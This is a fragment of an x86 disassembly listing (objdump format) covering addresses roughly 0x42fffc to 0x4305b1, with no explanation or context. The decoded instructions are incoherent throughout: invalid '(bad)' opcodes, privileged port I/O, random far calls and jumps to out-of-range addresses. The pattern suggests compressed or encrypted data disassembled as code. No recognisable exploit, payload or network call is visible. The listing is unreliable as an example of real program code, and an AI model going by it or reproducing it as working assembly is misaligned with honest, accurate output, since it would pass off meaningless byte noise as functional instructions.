  42fffc:	0d df 9a 1c ba       	or     $0xba1c9adf,%eax
  430001:	38 eb                	cmp    %ch,%bl
  430003:	33 b8 6c 3e 0e bc    	xor    -0x43f1c194(%eax),%edi
  430009:	0f 19 c7             	nop    %edi
  43000c:	6d                   	insl   (%dx),%es:(%edi)
  43000d:	ce                   	into
  43000e:	89 4c 5a 54          	mov    %ecx,0x54(%edx,%ebx,2)
  430012:	88 fc                	mov    %bh,%ah
  430014:	2c e6                	sub    $0xe6,%al
  430016:	62 38                	bound  %edi,(%eax)
  430018:	37                   	aaa
  430019:	4c                   	dec    %esp
  43001a:	fc                   	cld
  43001b:	dc 1a                	fcompl (%edx)
  43001d:	07                   	pop    %es
  43001e:	ed                   	in     (%dx),%eax
  43001f:	48                   	dec    %eax
  430020:	92                   	xchg   %eax,%edx
  430021:	fe                   	(bad)
  430022:	1b 76 29             	sbb    0x29(%esi),%esi
  430025:	93                   	xchg   %eax,%ebx
  430026:	82 92 f4 13 53 36 9c 	adcb   $0x9c,0x365313f4(%edx)
  43002d:	2b 98 fe f1 6c 66    	sub    0x666cf1fe(%eax),%ebx
  430033:	73 10                	jae    0x430045
  430035:	c4 47 30             	les    0x30(%edi),%eax
  430038:	89 47 46             	mov    %eax,0x46(%edi)
  43003b:	ce                   	into
  43003c:	b8 21 a5 f7 13       	mov    $0x13f7a521,%eax
  430041:	ae                   	scas   %es:(%edi),%al
  430042:	75 5f                	jne    0x4300a3
  430044:	c1 b8 99 8f 83 18 04 	sarl   $0x4,0x18838f99(%eax)
  43004b:	b1 94                	mov    $0x94,%cl
  43004d:	5f                   	pop    %edi
  43004e:	95                   	xchg   %eax,%ebp
  43004f:	74 6c                	je     0x4300bd
  430051:	ef                   	out    %eax,(%dx)
  430052:	4d                   	dec    %ebp
  430053:	dd 90 1d e8 3f c9    	fstl   -0x36c017e3(%eax)
  430059:	c2 40 44             	ret    $0x4440
  43005c:	49                   	dec    %ecx
  43005d:	c2 e3 9c             	ret    $0x9ce3
  430060:	bf 28 8d 3a 6f       	mov    $0x6f3a8d28,%edi
  430065:	b6 1c                	mov    $0x1c,%dh
  430067:	12 34 b3             	adc    (%ebx,%esi,4),%dh
  43006a:	9e                   	sahf
  43006b:	8a a7 08 41 29 bf    	mov    -0x40d6bef8(%edi),%ah
  430071:	e3 78                	jecxz  0x4300eb
  430073:	fa                   	cli
  430074:	98                   	cwtl
  430075:	f2 8f                	repnz (bad)
  430077:	3d 34 c5 ee a2       	cmp    $0xa2eec534,%eax
  43007c:	63 02                	arpl   %eax,(%edx)
  43007e:	31 f6                	xor    %esi,%esi
  430080:	06                   	push   %es
  430081:	4d                   	dec    %ebp
  430082:	e7 9b                	out    %eax,$0x9b
  430084:	06                   	push   %es
  430085:	71 f3                	jno    0x43007a
  430087:	c4 b5 00 f7 ba 2d    	les    0x2dbaf700(%ebp),%esi
  43008d:	cf                   	iret
  43008e:	dd 14 80             	fstl   (%eax,%eax,4)
  430091:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  430092:	87 50 b0             	xchg   %edx,-0x50(%eax)
  430095:	cc                   	int3
  430096:	ca a4 7d             	lret   $0x7da4
  430099:	fb                   	sti
  43009a:	0e                   	push   %cs
  43009b:	c1 73 cb 88          	shll   $0x88,-0x35(%ebx)
  43009f:	44                   	inc    %esp
  4300a0:	e1 c4                	loope  0x430066
  4300a2:	13 c5                	adc    %ebp,%eax
  4300a4:	f1                   	int1
  4300a5:	05 45 36 07 ea       	add    $0xea073645,%eax
  4300aa:	11 03                	adc    %eax,(%ebx)
  4300ac:	59                   	pop    %ecx
  4300ad:	9a 28 7c 45 13 74 cc 	lcall  $0xcc74,$0x13457c28
  4300b4:	63 7f de             	arpl   %edi,-0x22(%edi)
  4300b7:	76 59                	jbe    0x430112
  4300b9:	d8 bd c2 73 a7 5f    	fdivrs 0x5fa773c2(%ebp)
  4300bf:	36 7f b7             	ss jg  0x430079
  4300c2:	da cf                	fcmove %st(7),%st
  4300c4:	9a e6 c0 07 17 1e fc 	lcall  $0xfc1e,$0x1707c0e6
  4300cb:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4300cc:	c4 78 11             	les    0x11(%eax),%edi
  4300cf:	24 6a                	and    $0x6a,%al
  4300d1:	ca d7 af             	lret   $0xafd7
  4300d4:	7b 58                	jnp    0x43012e
  4300d6:	20 0f                	and    %cl,(%edi)
  4300d8:	86 81 a6 17 f7 5d    	xchg   %al,0x5df717a6(%ecx)
  4300de:	71 d2                	jno    0x4300b2
  4300e0:	a8 07                	test   $0x7,%al
  4300e2:	0c fc                	or     $0xfc,%al
  4300e4:	c4 3a                	les    (%edx),%edi
  4300e6:	c1 01 9d             	roll   $0x9d,(%ecx)
  4300e9:	13 72 bc             	adc    -0x44(%edx),%esi
  4300ec:	b8 3e 18 14 2d       	mov    $0x2d14183e,%eax
  4300f1:	dc c8                	fmul   %st,%st(0)
  4300f3:	de 30                	fidivs (%eax)
  4300f5:	5d                   	pop    %ebp
  4300f6:	22 95 17 10 48 dd    	and    -0x22b7efe9(%ebp),%dl
  4300fc:	b0 7c                	mov    $0x7c,%al
  4300fe:	b1 05                	mov    $0x5,%cl
  430100:	a3 bb 1a 00 ef       	mov    %eax,0xef001abb
  430105:	41                   	inc    %ecx
  430106:	21 48 fb             	and    %ecx,-0x5(%eax)
  430109:	48                   	dec    %eax
  43010a:	62 e2 74 93 bb       	(bad)
  43010f:	72 58                	jb     0x430169
  430111:	aa                   	stos   %al,%es:(%edi)
  430112:	e5 b9                	in     $0xb9,%eax
  430114:	cd eb                	int    $0xeb
  430116:	51                   	push   %ecx
  430117:	95                   	xchg   %eax,%ebp
  430118:	3d 83 12 fd b4       	cmp    $0xb4fd1283,%eax
  43011d:	27                   	daa
  43011e:	3d 70 91 1d 1a       	cmp    $0x1a1d9170,%eax
  430123:	90                   	nop
  430124:	9d                   	popf
  430125:	cc                   	int3
  430126:	58                   	pop    %eax
  430127:	f7 9d 46 c0 61 bc    	negl   -0x439e3fba(%ebp)
  43012d:	69 38 52 ae 4a 33    	imul   $0x334aae52,(%eax),%edi
  430133:	e0 19                	loopne 0x43014e
  430135:	f3 11 ca             	repz adc %ecx,%edx
  430138:	0a e0                	or     %al,%ah
  43013a:	92                   	xchg   %eax,%edx
  43013b:	e1 01                	loope  0x43013e
  43013d:	46                   	inc    %esi
  43013e:	03 ed                	add    %ebp,%ebp
  430140:	02 d8                	add    %al,%bl
  430142:	e9 0f df 8a 02       	jmp    0x2cde056
  430147:	b3 5d                	mov    $0x5d,%bl
  430149:	ab                   	stos   %eax,%es:(%edi)
  43014a:	77 6f                	ja     0x4301bb
  43014c:	52                   	push   %edx
  43014d:	77 f0                	ja     0x43013f
  43014f:	82 c7 3d             	add    $0x3d,%bh
  430152:	cc                   	int3
  430153:	ce                   	into
  430154:	32 fb                	xor    %bl,%bh
  430156:	19 dc                	sbb    %ebx,%esp
  430158:	bc 6c 29 67 82       	mov    $0x8267296c,%esp
  43015d:	37                   	aaa
  43015e:	be 36 26 88 98       	mov    $0x98882636,%esi
  430163:	b1 bc                	mov    $0xbc,%cl
  430165:	d4 7f                	aam    $0x7f
  430167:	d8 e7                	fsub   %st(7),%st
  430169:	d7                   	xlat   %ds:(%ebx)
  43016a:	13 29                	adc    (%ecx),%ebp
  43016c:	c3                   	ret
  43016d:	f6 3e                	idivb  (%esi)
  43016f:	cd 78                	int    $0x78
  430171:	02 57 35             	add    0x35(%edi),%dl
  430174:	4e                   	dec    %esi
  430175:	11 d9                	adc    %ebx,%ecx
  430177:	c3                   	ret
  430178:	ff b2 d3 c0 2b fa    	push   -0x5d43f2d(%edx)
  43017e:	2f                   	das
  43017f:	f9                   	stc
  430180:	dd 55 49             	fstl   0x49(%ebp)
  430183:	25 6d ef 7c a2       	and    $0xa27cef6d,%eax
  430188:	2f                   	das
  430189:	40                   	inc    %eax
  43018a:	1e                   	push   %ds
  43018b:	c8 7a 7b dd          	enter  $0x7b7a,$0xdd
  43018f:	85 6f 16             	test   %ebp,0x16(%edi)
  430192:	e1 7e                	loope  0x430212
  430194:	5a                   	pop    %edx
  430195:	d6                   	salc
  430196:	c2 bf 5f             	ret    $0x5fbf
  430199:	2a 25 5a d9 0f 4e    	sub    0x4e0fd95a,%ah
  43019f:	bf 60 85 0c c5       	mov    $0xc50c8560,%edi
  4301a4:	07                   	pop    %es
  4301a5:	ca 1b de             	lret   $0xde1b
  4301a8:	fc                   	cld
  4301a9:	57                   	push   %edi
  4301aa:	c7                   	(bad)
  4301ab:	7d 6c                	jge    0x430219
  4301ad:	70 5c                	jo     0x43020b
  4301af:	c0 ba ea b2 0c e0 0a 	sarb   $0xa,-0x1ff34d16(%edx)
  4301b6:	d8 46 9a             	fadds  -0x66(%esi)
  4301b9:	2b 69 f5             	sub    -0xb(%ecx),%ebp
  4301bc:	30 85 55 02 61 86    	xor    %al,-0x799efdab(%ebp)
  4301c2:	e5 a7                	in     $0xa7,%eax
  4301c4:	7e 7b                	jle    0x430241
  4301c6:	ad                   	lods   %ds:(%esi),%eax
  4301c7:	23 c8                	and    %eax,%ecx
  4301c9:	d3 5a b7             	rcrl   %cl,-0x49(%edx)
  4301cc:	64 ec                	fs in  (%dx),%al
  4301ce:	0c fd                	or     $0xfd,%al
  4301d0:	56                   	push   %esi
  4301d1:	dc 90 05 b4 92 9d    	fcoml  -0x626d4bfb(%eax)
  4301d7:	46                   	inc    %esi
  4301d8:	87 8a 6f 7f f0 cc    	xchg   %ecx,-0x330f8091(%edx)
  4301de:	1d 2c eb ff 44       	sbb    $0x44ffeb2c,%eax
  4301e3:	22 79 6a             	and    0x6a(%ecx),%bh
  4301e6:	bd 1a e2 cb 41       	mov    $0x41cbe21a,%ebp
  4301eb:	48                   	dec    %eax
  4301ec:	9b                   	fwait
  4301ed:	4d                   	dec    %ebp
  4301ee:	7a be                	jp     0x4301ae
  4301f0:	e1 d4                	loope  0x4301c6
  4301f2:	8a 4b 10             	mov    0x10(%ebx),%cl
  4301f5:	9a 5f 19 d8 20 fa 9d 	lcall  $0x9dfa,$0x20d8195f
  4301fc:	9e                   	sahf
  4301fd:	fb                   	sti
  4301fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4301ff:	96                   	xchg   %eax,%esi
  430200:	6c                   	insb   (%dx),%es:(%edi)
  430201:	32 33                	xor    (%ebx),%dh
  430203:	55                   	push   %ebp
  430204:	1d 8a 9a ef c1       	sbb    $0xc1ef9a8a,%eax
  430209:	7f 27                	jg     0x430232
  43020b:	82 d1 71             	adc    $0x71,%cl
  43020e:	94                   	xchg   %eax,%esp
  43020f:	cf                   	iret
  430210:	ad                   	lods   %ds:(%esi),%eax
  430211:	41                   	inc    %ecx
  430212:	48                   	dec    %eax
  430213:	af                   	scas   %es:(%edi),%eax
  430214:	fc                   	cld
  430215:	f4                   	hlt
  430216:	24 4a                	and    $0x4a,%al
  430218:	49                   	dec    %ecx
  430219:	3d e9 a1 bd bb       	cmp    $0xbbbda1e9,%eax
  43021e:	e9 5f b8 54 4b       	jmp    0x4b97ba82
  430223:	d7                   	xlat   %ds:(%ebx)
  430224:	49                   	dec    %ecx
  430225:	9f                   	lahf
  430226:	64 7c a0             	fs jl  0x4301c9
  430229:	f2 bb d3 bd 2f b0    	repnz mov $0xb02fbdd3,%ebx
  43022f:	b3 eb                	mov    $0xeb,%bl
  430231:	ec                   	in     (%dx),%al
  430232:	6a 35                	push   $0x35
  430234:	fb                   	sti
  430235:	97                   	xchg   %eax,%edi
  430236:	f5                   	cmc
  430237:	d2 46 58             	rolb   %cl,0x58(%esi)
  43023a:	55                   	push   %ebp
  43023b:	63 7d ef             	arpl   %edi,-0x11(%ebp)
  43023e:	85 c1                	test   %eax,%ecx
  430240:	cf                   	iret
  430241:	c1 52 86 2f          	rcll   $0x2f,-0x7a(%edx)
  430245:	fb                   	sti
  430246:	1b 45 96             	sbb    -0x6a(%ebp),%eax
  430249:	4e                   	dec    %esi
  43024a:	ee                   	out    %al,(%dx)
  43024b:	4b                   	dec    %ebx
  43024c:	91                   	xchg   %eax,%ecx
  43024d:	fe 8b 68 1b e7 52    	decb   0x52e71b68(%ebx)
  430253:	6f                   	outsl  %ds:(%esi),(%dx)
  430254:	58                   	pop    %eax
  430255:	09 cd                	or     %ecx,%ebp
  430257:	f5                   	cmc
  430258:	2f                   	das
  430259:	44                   	inc    %esp
  43025a:	ea ba 7f 62 9a 00 9b 	ljmp   $0x9b00,$0x9a627fba
  430261:	ef                   	out    %eax,(%dx)
  430262:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  430263:	ff                   	(bad)
  430264:	b9 cc 65 a8 64       	mov    $0x64a865cc,%ecx
  430269:	6b 96 6c c1 f1 00 2f 	imul   $0x2f,0xf1c16c(%esi),%edx
  430270:	c7                   	(bad)
  430271:	71 51                	jno    0x4302c4
  430273:	a2 b3 cc f7 a5       	mov    %al,0xa5f7ccb3
  430278:	97                   	xchg   %eax,%edi
  430279:	72 ab                	jb     0x430226
  43027b:	b4 fa                	mov    $0xfa,%ah
  43027d:	4b                   	dec    %ebx
  43027e:	d8 f9                	fdivr  %st(1),%st
  430280:	13 56 b2             	adc    -0x4e(%esi),%edx
  430283:	62 23                	bound  %esp,(%ebx)
  430285:	43                   	inc    %ebx
  430286:	00 12                	add    %dl,(%edx)
  430288:	03 22                	add    (%edx),%esp
  43028a:	37                   	aaa
  43028b:	a3 b9 da 3e 18       	mov    %eax,0x183edab9
  430290:	25 d7 a3 d9 2e       	and    $0x2ed9a3d7,%eax
  430295:	cd e2                	int    $0xe2
  430297:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  430298:	ae                   	scas   %es:(%edi),%al
  430299:	b8 68 b6 3f 5f       	mov    $0x5f3fb668,%eax
  43029e:	6f                   	outsl  %ds:(%esi),(%dx)
  43029f:	60                   	pusha
  4302a0:	40                   	inc    %eax
  4302a1:	28 ec                	sub    %ch,%ah
  4302a3:	1d 01 e9 ac 5b       	sbb    $0x5bace901,%eax
  4302a8:	30 a4 2a fd d7 4f 67 	xor    %ah,0x674fd7fd(%edx,%ebp,1)
  4302af:	ab                   	stos   %eax,%es:(%edi)
  4302b0:	30 f8                	xor    %bh,%al
  4302b2:	62 69 f8             	bound  %ebp,-0x8(%ecx)
  4302b5:	44                   	inc    %esp
  4302b6:	ad                   	lods   %ds:(%esi),%eax
  4302b7:	be d1 f7 2e e2       	mov    $0xe22ef7d1,%esi
  4302bc:	56                   	push   %esi
  4302bd:	24 fb                	and    $0xfb,%al
  4302bf:	28 43 92             	sub    %al,-0x6e(%ebx)
  4302c2:	6c                   	insb   (%dx),%es:(%edi)
  4302c3:	23 fd                	and    %ebp,%edi
  4302c5:	c4 ad 71 9e 8e aa    	les    -0x5571618f(%ebp),%ebp
  4302cb:	11 65 e5             	adc    %esp,-0x1b(%ebp)
  4302ce:	a9 e3 52 9a 3e       	test   $0x3e9a52e3,%eax
  4302d3:	90                   	nop
  4302d4:	4c                   	dec    %esp
  4302d5:	61                   	popa
  4302d6:	ec                   	in     (%dx),%al
  4302d7:	66 b3 6c             	data16 mov $0x6c,%bl
  4302da:	bd d8 ae c3 a4       	mov    $0xa4c3aed8,%ebp
  4302df:	83 3d 52 40 93 78 40 	cmpl   $0x40,0x78934052
  4302e6:	95                   	xchg   %eax,%ebp
  4302e7:	6c                   	insb   (%dx),%es:(%edi)
  4302e8:	34 19                	xor    $0x19,%al
  4302ea:	6c                   	insb   (%dx),%es:(%edi)
  4302eb:	40                   	inc    %eax
  4302ec:	46                   	inc    %esi
  4302ed:	9e                   	sahf
  4302ee:	95                   	xchg   %eax,%ebp
  4302ef:	ae                   	scas   %es:(%edi),%al
  4302f0:	53                   	push   %ebx
  4302f1:	81 75 0b 35 da 0c ff 	xorl   $0xff0cda35,0xb(%ebp)
  4302f8:	da d4                	fcmovbe %st(4),%st
  4302fa:	63 64 42 b6          	arpl   %esp,-0x4a(%edx,%eax,2)
  4302fe:	f2 ec                	repnz in (%dx),%al
  430300:	8c 10                	mov    %ss,(%eax)
  430302:	67 e5 e8             	addr16 in $0xe8,%eax
  430305:	70 09                	jo     0x430310
  430307:	e9 e3 7c 6c 95       	jmp    0x95af7fef
  43030c:	58                   	pop    %eax
  43030d:	6b 84 c2 fe 9f a9 7d 	imul   $0x1e,0x7da99ffe(%edx,%eax,8),%eax
  430314:	1e 
  430315:	eb c3                	jmp    0x4302da
  430317:	d5 29                	aad    $0x29
  430319:	41                   	inc    %ecx
  43031a:	cd 54                	int    $0x54
  43031c:	53                   	push   %ebx
  43031d:	cd ca                	int    $0xca
  43031f:	19 73 78             	sbb    %esi,0x78(%ebx)
  430322:	08 d8                	or     %bl,%al
  430324:	c4 53 16             	les    0x16(%ebx),%edx
  430327:	60                   	pusha
  430328:	1c ec                	sbb    $0xec,%al
  43032a:	f2 b0 b0             	repnz mov $0xb0,%al
  43032d:	33 27                	xor    (%edi),%esp
  43032f:	2e c6                	cs (bad)
  430331:	e9 78 f4 74 25       	jmp    0x25b7f7ae
  430336:	ec                   	in     (%dx),%al
  430337:	94                   	xchg   %eax,%esp
  430338:	36 10 d9             	ss adc %bl,%cl
  43033b:	97                   	xchg   %eax,%edi
  43033c:	cd 27                	int    $0x27
  43033e:	44                   	inc    %esp
  43033f:	73 6d                	jae    0x4303ae
  430341:	a1 a5 9d f8 c3       	mov    0xc3f89da5,%eax
  430346:	41                   	inc    %ecx
  430347:	82 cf ec             	or     $0xec,%bh
  43034a:	3b 87 8d 82 00 b2    	cmp    -0x4dff7d73(%edi),%eax
  430350:	97                   	xchg   %eax,%edi
  430351:	bc 47 04 58 ef       	mov    $0xef580447,%esp
  430356:	a0 2f d5 e5 31       	mov    0x31e5d52f,%al
  43035b:	18 63 f2             	sbb    %ah,-0xe(%ebx)
  43035e:	ae                   	scas   %es:(%edi),%al
  43035f:	29 7f 87             	sub    %edi,-0x79(%edi)
  430362:	bb 7b 6c 74 25       	mov    $0x25746c7b,%ebx
  430367:	09 ce                	or     %ecx,%esi
  430369:	17                   	pop    %ss
  43036a:	d0 5b cb             	rcrb   $1,-0x35(%ebx)
  43036d:	df a7 92 d2 13 b1    	fbld   -0x4eec2d6e(%edi)
  430373:	2c c5                	sub    $0xc5,%al
  430375:	96                   	xchg   %eax,%esi
  430376:	2e 7c 5a             	jl,pn  0x4303d3
  430379:	72 7f                	jb     0x4303fa
  43037b:	87 f2                	xchg   %esi,%edx
  43037d:	3e 03 5e 80          	add    %ds:-0x80(%esi),%ebx
  430381:	88 15 b6 df 57 fd    	mov    %dl,0xfd57dfb6
  430387:	84 43 3d             	test   %al,0x3d(%ebx)
  43038a:	03 a7 14 4e 80 69    	add    0x69804e14(%edi),%esp
  430390:	87 b4 ee cc f5 49 b5 	xchg   %esi,-0x4ab60a34(%esi,%ebp,8)
  430397:	9d                   	popf
  430398:	07                   	pop    %es
  430399:	dc a1 cf e2 1f 6f    	fsubl  0x6f1fe2cf(%ecx)
  43039f:	34 af                	xor    $0xaf,%al
  4303a1:	44                   	inc    %esp
  4303a2:	c4 bc 0b 74 4f d2 36 	les    0x36d24f74(%ebx,%ecx,1),%edi
  4303a9:	9a 6a 23 01 8d 5b 18 	lcall  $0x185b,$0x8d01236a
  4303b0:	8c d5                	mov    %ss,%ebp
  4303b2:	12 7e 84             	adc    -0x7c(%esi),%bh
  4303b5:	1c 87                	sbb    $0x87,%al
  4303b7:	94                   	xchg   %eax,%esp
  4303b8:	f7 c0 40 e7 6e a9    	test   $0xa96ee740,%eax
  4303be:	d9 94 e5 56 ec 37 3b 	fsts   0x3b37ec56(%ebp,%eiz,8)
  4303c5:	b7 4a                	mov    $0x4a,%bh
  4303c7:	63 50 33             	arpl   %edx,0x33(%eax)
  4303ca:	0e                   	push   %cs
  4303cb:	f3 4b                	repz dec %ebx
  4303cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4303ce:	e9 ea 36 08 d9       	jmp    0xd94b3abd
  4303d3:	70 92                	jo     0x430367
  4303d5:	c9                   	leave
  4303d6:	1a 4d e9             	sbb    -0x17(%ebp),%cl
  4303d9:	f8                   	clc
  4303da:	bc b6 e4 d2 2c       	mov    $0x2cd2e4b6,%esp
  4303df:	15 c6 01 37 e5       	adc    $0xe53701c6,%eax
  4303e4:	95                   	xchg   %eax,%ebp
  4303e5:	af                   	scas   %es:(%edi),%eax
  4303e6:	81 83 ba c1 ae ec b8 	addl   $0x88b25bb8,-0x13513e46(%ebx)
  4303ed:	5b b2 88 
  4303f0:	03 22                	add    (%edx),%esp
  4303f2:	35 e5 cf fb 83       	xor    $0x83fbcfe5,%eax
  4303f7:	dc 5e fb             	fcompl -0x5(%esi)
  4303fa:	09 c7                	or     %eax,%edi
  4303fc:	56                   	push   %esi
  4303fd:	16                   	push   %ss
  4303fe:	1c 6f                	sbb    $0x6f,%al
  430400:	c4 a0 5c da 46 e3    	les    -0x1cb925a4(%eax),%esp
  430406:	cc                   	int3
  430407:	39 a2 fc 9b cd ea    	cmp    %esp,-0x15326404(%edx)
  43040d:	64 da f3             	fs (bad)
  430410:	65 34 16             	gs xor $0x16,%al
  430413:	a0 4f 1c fc 91       	mov    0x91fc1c4f,%al
  430418:	86 26                	xchg   %ah,(%esi)
  43041a:	dd c3                	ffree  %st(3)
  43041c:	28 64 fe 29          	sub    %ah,0x29(%esi,%edi,8)
  430420:	3e ae                	ds scas %es:(%edi),%al
  430422:	95                   	xchg   %eax,%ebp
  430423:	99                   	cltd
  430424:	7a 5c                	jp     0x430482
  430426:	e7 a5                	out    %eax,$0xa5
  430428:	db f5                	fcomi  %st(5),%st
  43042a:	22 07                	and    (%edi),%al
  43042c:	5b                   	pop    %ebx
  43042d:	60                   	pusha
  43042e:	ed                   	in     (%dx),%eax
  43042f:	03 e0                	add    %eax,%esp
  430431:	ac                   	lods   %ds:(%esi),%al
  430432:	4f                   	dec    %edi
  430433:	1b 9a d2 ca 94 12    	sbb    0x1294cad2(%edx),%ebx
  430439:	8c 96 e9 3b 0f ac    	mov    %ss,-0x53f0c417(%esi)
  43043f:	33 36                	xor    (%esi),%esi
  430441:	45                   	inc    %ebp
  430442:	fa                   	cli
  430443:	08 2a                	or     %ch,(%edx)
  430445:	66 c1 b5 0a 06 35 ed 	shlw   $0x7a,-0x12caf9f6(%ebp)
  43044c:	7a 
  43044d:	7a 5d                	jp     0x4304ac
  43044f:	63 aa db d6 21 e4    	arpl   %ebp,-0x1bde2925(%edx)
  430455:	11 bf 8c 57 7c 9f    	adc    %edi,-0x6083a874(%edi)
  43045b:	b7 95                	mov    $0x95,%bh
  43045d:	01 47 29             	add    %eax,0x29(%edi)
  430460:	6d                   	insl   (%dx),%es:(%edi)
  430461:	50                   	push   %eax
  430462:	11 d9                	adc    %ebx,%ecx
  430464:	d5 6f                	aad    $0x6f
  430466:	06                   	push   %es
  430467:	8e 5c 9f 5c          	mov    0x5c(%edi,%ebx,4),%ds
  43046b:	53                   	push   %ebx
  43046c:	b4 7d                	mov    $0x7d,%ah
  43046e:	78 5a                	js     0x4304ca
  430470:	6d                   	insl   (%dx),%es:(%edi)
  430471:	4e                   	dec    %esi
  430472:	0f 06                	clts
  430474:	8e c6                	mov    %esi,%es
  430476:	36 bb 84 36 21 f2    	ss mov $0xf2213684,%ebx
  43047c:	d8 21                	fsubs  (%ecx)
  43047e:	70 57                	jo     0x4304d7
  430480:	b4 a2                	mov    $0xa2,%ah
  430482:	6f                   	outsl  %ds:(%esi),(%dx)
  430483:	bb 2e 79 b8 5b       	mov    $0x5bb8792e,%ebx
  430488:	12 a9 3a 03 6f 03    	adc    0x36f033a(%ecx),%ch
  43048e:	d6                   	salc
  43048f:	07                   	pop    %es
  430490:	35 fa 28 2c 83       	xor    $0x832c28fa,%eax
  430495:	00 ac fb cf 4c 4e 40 	add    %ch,0x404e4ccf(%ebx,%edi,8)
  43049c:	c5 81 d3 a0 a3 33    	lds    0x33a3a0d3(%ecx),%eax
  4304a2:	43                   	inc    %ebx
  4304a3:	4b                   	dec    %ebx
  4304a4:	d8 25 5f a7 c0 c9    	fsubs  0xc9c0a75f
  4304aa:	76 3a                	jbe    0x4304e6
  4304ac:	95                   	xchg   %eax,%ebp
  4304ad:	aa                   	stos   %al,%es:(%edi)
  4304ae:	08 9c 74 0b ff c2 f0 	or     %bl,-0xf3d00f5(%esp,%esi,2)
  4304b5:	f2 ab                	repnz stos %eax,%es:(%edi)
  4304b7:	8c 0d 49 a6 6a bd    	mov    %cs,0xbd6aa649
  4304bd:	91                   	xchg   %eax,%ecx
  4304be:	6d                   	insl   (%dx),%es:(%edi)
  4304bf:	81 34 83 b8 13 b3 14 	xorl   $0x14b313b8,(%ebx,%eax,4)
  4304c6:	29 8e 0c ac 2d 1c    	sub    %ecx,0x1c2dac0c(%esi)
  4304cc:	0b 7c fe 30          	or     0x30(%esi,%edi,8),%edi
  4304d0:	1d f7 fe e3 13       	sbb    $0x13e3fef7,%eax
  4304d5:	1d 5e 02 b2 45       	sbb    $0x45b2025e,%eax
  4304da:	a3 b0 c3 23 2a       	mov    %eax,0x2a23c3b0
  4304df:	99                   	cltd
  4304e0:	2e 05 09 de cb 81    	cs add $0x81cbde09,%eax
  4304e6:	4b                   	dec    %ebx
  4304e7:	04 7e                	add    $0x7e,%al
  4304e9:	e4 3e                	in     $0x3e,%al
  4304eb:	ac                   	lods   %ds:(%esi),%al
  4304ec:	d8 9a 47 05 65 6b    	fcomps 0x6b650547(%edx)
  4304f2:	55                   	push   %ebp
  4304f3:	54                   	push   %esp
  4304f4:	9b                   	fwait
  4304f5:	98                   	cwtl
  4304f6:	b9 df be 89 5a       	mov    $0x5a89bedf,%ecx
  4304fb:	52                   	push   %edx
  4304fc:	58                   	pop    %eax
  4304fd:	e7 d7                	out    %eax,$0xd7
  4304ff:	f5                   	cmc
  430500:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  430501:	a3 21 89 85 13       	mov    %eax,0x13858921
  430506:	54                   	push   %esp
  430507:	46                   	inc    %esi
  430508:	c9                   	leave
  430509:	f8                   	clc
  43050a:	3d f8 98 31 66       	cmp    $0x663198f8,%eax
  43050f:	2e 4e                	cs dec %esi
  430511:	96                   	xchg   %eax,%esi
  430512:	ed                   	in     (%dx),%eax
  430513:	86 bc 94 f0 2c 51 ea 	xchg   %bh,-0x15aed310(%esp,%edx,4)
  43051a:	aa                   	stos   %al,%es:(%edi)
  43051b:	ac                   	lods   %ds:(%esi),%al
  43051c:	19 d7                	sbb    %edx,%edi
  43051e:	b2 99                	mov    $0x99,%dl
  430520:	e5 21                	in     $0x21,%eax
  430522:	d6                   	salc
  430523:	56                   	push   %esi
  430524:	58                   	pop    %eax
  430525:	e3 55                	jecxz  0x43057c
  430527:	2f                   	das
  430528:	35 ea 3a ea 91       	xor    $0x91ea3aea,%eax
  43052d:	ae                   	scas   %es:(%edi),%al
  43052e:	a1 c4 e5 49 40       	mov    0x4049e5c4,%eax
  430533:	d6                   	salc
  430534:	77 23                	ja     0x430559
  430536:	e6 04                	out    %al,$0x4
  430538:	6e                   	outsb  %ds:(%esi),(%dx)
  430539:	3b 76 17             	cmp    0x17(%esi),%esi
  43053c:	c0 96 e0 ba 9a a9 09 	rclb   $0x9,-0x56654520(%esi)
  430543:	6c                   	insb   (%dx),%es:(%edi)
  430544:	c4 08                	les    (%eax),%ecx
  430546:	74 5f                	je     0x4305a7
  430548:	ef                   	out    %eax,(%dx)
  430549:	6c                   	insb   (%dx),%es:(%edi)
  43054a:	54                   	push   %esp
  43054b:	93                   	xchg   %eax,%ebx
  43054c:	88 ca                	mov    %cl,%dl
  43054e:	02 46 59             	add    0x59(%esi),%al
  430551:	54                   	push   %esp
  430552:	1b ea                	sbb    %edx,%ebp
  430554:	2c 41                	sub    $0x41,%al
  430556:	c1 7c 2e 0a cd       	sarl   $0xcd,0xa(%esi,%ebp,1)
  43055b:	e4 f2                	in     $0xf2,%al
  43055d:	62 93 d5 28 50 d3    	bound  %edx,-0x2cafd72b(%ebx)
  430563:	b2 19                	mov    $0x19,%dl
  430565:	72 ea                	jb     0x430551
  430567:	01 35 ca f9 a5 5b    	add    %esi,0x5ba5f9ca
  43056d:	97                   	xchg   %eax,%edi
  43056e:	32 15 48 d0 fa 78    	xor    0x78fad048,%dl
  430574:	ff 22                	jmp    *(%edx)
  430576:	e4 47                	in     $0x47,%al
  430578:	34 f6                	xor    $0xf6,%al
  43057a:	83 fa 5f             	cmp    $0x5f,%edx
  43057d:	d7                   	xlat   %ds:(%ebx)
  43057e:	32 d6                	xor    %dh,%dl
  430580:	37                   	aaa
  430581:	af                   	scas   %es:(%edi),%eax
  430582:	ce                   	into
  430583:	48                   	dec    %eax
  430584:	0a a7 c8 98 f2 d3    	or     -0x2c0d6738(%edi),%ah
  43058a:	ff 41 c0             	incl   -0x40(%ecx)
  43058d:	9b                   	fwait
  43058e:	8e cf                	mov    %edi,%cs
  430590:	a2 78 de 8f 45       	mov    %al,0x458fde78
  430595:	c4                   	(bad)
  430596:	cc                   	int3
  430597:	d2 1e                	rcrb   %cl,(%esi)
  430599:	49                   	dec    %ecx
  43059a:	b3 90                	mov    $0x90,%bl
  43059c:	63 39                	arpl   %edi,(%ecx)
  43059e:	2c 43                	sub    $0x43,%al
  4305a0:	f5                   	cmc
  4305a1:	a2 15 21 33 94       	mov    %al,0x94332115
  4305a6:	92                   	xchg   %eax,%edx
  4305a7:	c8 af 50 b9          	enter  $0x50af,$0xb9
  4305ab:	3c bb                	cmp    $0xbb,%al
  4305ad:	d4 43                	aam    $0x43
  4305af:	f5                   	cmc
  4305b0:	41                   	inc    %ecx
  4305b1:	e7 7f                	out    %eax,$0x7f
